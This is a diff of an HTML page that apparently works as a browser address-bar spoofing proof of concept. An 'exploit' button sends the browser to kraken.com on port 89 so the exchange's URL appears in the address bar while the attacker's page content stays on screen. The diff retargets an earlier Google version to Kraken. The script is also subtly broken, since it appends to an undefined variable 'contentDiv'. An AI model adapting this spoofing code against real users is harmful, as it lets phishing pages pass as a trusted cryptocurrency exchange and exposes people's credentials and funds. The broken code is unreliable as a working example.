@@ -4,29 +4,26 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting in 30 Seconds</title>
-  <script>
-     let startTime = null;
-    let intervalId = null;
-    function spoof(){
-    
-location = "https://www.google.com:89";
-location = "https://www.google.com:89";
-      startTime = performance.now();
-
-      intervalId = setInterval(() => {
-        const now = performance.now();
-        const elapsed = (now - startTime) / 1000;
-        document.getElementById("stopwatch").textContent = `${elapsed.toFixed(2)} s`;
-      }, 100); // Update every 100ms
-      setInterval(function() {
-        location = "https://www.google.com:89"; // Change this to your target URL
+  <title>Kraken</title>
+  <script> 
+    function spoof(){    
+location = "https://www.kraken.com:89";
+location = "https://www.kraken.com:89";
+    const content = document.getElementById('content');
+    const newParagraph = document.createElement('p');
+    newParagraph.textContent = 'This is not Kraken website.';
+    contentDiv.appendChild(newParagraph);
+    const submitBtn = document.getElementById('submitButton');
+    submitBtn.remove();
+  
+      setTimeout(function() {
+        location = "https://www.kraken.com";
       }, 120000); 
     };
   </script>
 </head>
 <body>
-  <input type="button" value="exploit" onclick="spoof();" />
-   <div id="stopwatch">0.00 s</div>
+  <input id="submitButton" type="button" value="exploit" onclick="spoof();" />
+  <div id="content"></div>
 </body>
 </html>
